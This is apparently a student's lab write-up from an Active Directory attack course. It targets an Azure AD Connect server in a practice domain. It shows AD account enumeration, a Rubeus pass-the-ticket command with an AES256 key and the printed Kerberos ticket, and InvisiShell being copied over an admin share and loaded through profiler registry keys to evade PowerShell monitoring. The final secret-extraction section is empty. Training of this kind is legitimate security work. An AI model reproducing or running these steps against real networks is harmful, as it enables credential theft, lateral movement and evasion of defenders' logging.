# Hands-On 19:

```
Find out the machine where Azure AD Connect is installed.
Compromise the machine and extract the password of AD Connect user in clear-text.
Using the AD Connect user's password, extract secrets from us-dc and techcorp-dc.
```

## Index Of Content:

  1. [Find Machine Azure AD](#find-machine-azure-ad)
  2. [Compromise machine](#compromise-machine)
  3. [Extract secrets](#extract-secrets)

## Find Machine Azure AD

```
PS C:\Users\studentuser17> Get-ADUser -Filter "SamAccountName -like '*'" -Server techcorp.local -Properties *| select  SamAccountName, Description | fl


SamAccountName : Administrator
Description    : Built-in account for administering the computer/domain

SamAccountName : Guest
Description    : Built-in account for guest access to the computer/domain

SamAccountName : krbtgt
Description    : Key Distribution Center Service Account

SamAccountName : US$
Description    :

SamAccountName : MSOL_16fb75d0227d
Description    : Account created by Microsoft Azure Active Directory Connect with installation identifier 16fb75d0227d4957868d5c4ae0688943 running on computer US-ADCONNECT configured to synchronize to tenant
                 techcorpus.onmicrosoft.com. This account must have directory replication permissions in the local Active Directory and write permission on certain attributes to enable Hybrid Deployment.

SamAccountName : $431000-R3GTAO0291F9
Description    :

SamAccountName : SM_6fcd6ac55a6146a0a
Description    :

SamAccountName : SM_154a18cd4a8e48f09
Description    :

SamAccountName : SM_01a48ed0a28c423d9
Description    :

SamAccountName : SM_37c4dd3af61044398
Description    :

SamAccountName : SM_8b0a3d48bd2541249
Description    :

SamAccountName : SM_8bf409db7e874ebe9
Description    :

SamAccountName : SM_73d4ee9dc8674c898
Description    :

SamAccountName : SM_eca5036b49c740608
Description    :

SamAccountName : SM_309ad2430f0b4251b
Description    :

SamAccountName : USVENDOR$
Description    :

SamAccountName : BASTION$
Description    :

SamAccountName : privuser
Description    :

SamAccountName : testuser
Description    :

```

## Compromise machine

Request Kerberos TGT, for helpdesk admin
```
C:\AD\Tools\Rubeus.exe asktgt /domain:us.techcorp.local /user:helpdeskadmin /aes256:f3ac0c70b3fdb36f25c0d5c9cc552fe9f94c39b705c4088a2bb7219ae9fb6534 /opsec /createonly:C:\Windows\System32\cmd.exe /show /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: Ask TGT

[*] Using domain controller: US-DC.us.techcorp.local (192.168.1.2)
[!] Pre-Authentication required!
[!]     AES256 Salt: US.TECHCORP.LOCALhelpdeskadmin
[*] Using aes256_cts_hmac_sha1 hash: f3ac0c70b3fdb36f25c0d5c9cc552fe9f94c39b705c4088a2bb7219ae9fb6534
[*] Building AS-REQ (w/ preauth) for: 'us.techcorp.local\helpdeskadmin'
[*] Using domain controller: 192.168.1.2:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
      EVVTLlRFQ0hDT1JQLkxPQ0FM
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/US.TECHCORP.LOCAL
  ServiceRealm             :  US.TECHCORP.LOCAL
  UserName                 :  helpdeskadmin
  UserRealm                :  US.TECHCORP.LOCAL
  StartTime                :  2/27/2023 12:05:39 PM
  EndTime                  :  2/27/2023 10:05:39 PM
  RenewTill                :  3/6/2023 12:05:39 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  Ayo7g2rahNEEg2Noe5j5D272H3uPYdttZvf8RIx1a/c=
  ASREP (key)              :  F3AC0C70B3FDB36F25C0D5C9CC552FE9F94C39B705C4088A2BB7219AE9FB6534

```
Copy Invishishell:

```
C:\Users\studentuser17>echo F | xcopy C:\AD\Tools\InviShell\InShellProf.dll \\us-adconnect\C$\Users\helpdeskadmin\Downloads\InshellProf.dll
Does \\us-adconnect\C$\Users\helpdeskadmin\Downloads\InshellProf.dll specify a file name
or directory name on the target
(F = file, D = directory)? F
C:\AD\Tools\InviShell\InShellProf.dll
1 File(s) copied

>echo F | xcopy C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat \\us-adconnect\C$\Users\helpdeskadmin\Downloads\RunWithRegistryNonAdmin.bat
Does \\us-adconnect\C$\Users\helpdeskadmin\Downloads\RunWithRegistryNonAdmin.bat specify a file name
or directory name on the target
(F = file, D = directory)? F
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
1 File(s) copied

```
Access and load invishishell:

```
C:\Users\helpdeskadmin>cd Downloads
cd Downloads

C:\Users\helpdeskadmin\Downloads>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 88AD-6C8B

 Directory of C:\Users\helpdeskadmin\Downloads

02/27/2023  12:09 PM    <DIR>          .
02/27/2023  12:09 PM    <DIR>          ..
12/31/2020  02:14 AM           117,248 InshellProf.dll
12/31/2020  02:16 AM               544 RunWithRegistryNonAdmin.bat
               2 File(s)        117,792 bytes
               2 Dir(s)  13,990,985,728 bytes free

C:\Users\helpdeskadmin\Downloads>.\RunWithRegistryNonAdmin.bat
.\RunWithRegistryNonAdmin.bat

C:\Users\helpdeskadmin\Downloads>set COR_ENABLE_PROFILING=1

C:\Users\helpdeskadmin\Downloads>set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}

C:\Users\helpdeskadmin\Downloads>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
The operation completed successfully.

C:\Users\helpdeskadmin\Downloads>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /f
The operation completed successfully.

C:\Users\helpdeskadmin\Downloads>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /ve /t REG_SZ /d "C:\Users\helpdeskadmin\Downloads\InShellProf.dll" /f
The operation completed successfully.

C:\Users\helpdeskadmin\Downloads>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.


```
## Extract secrets

```
```

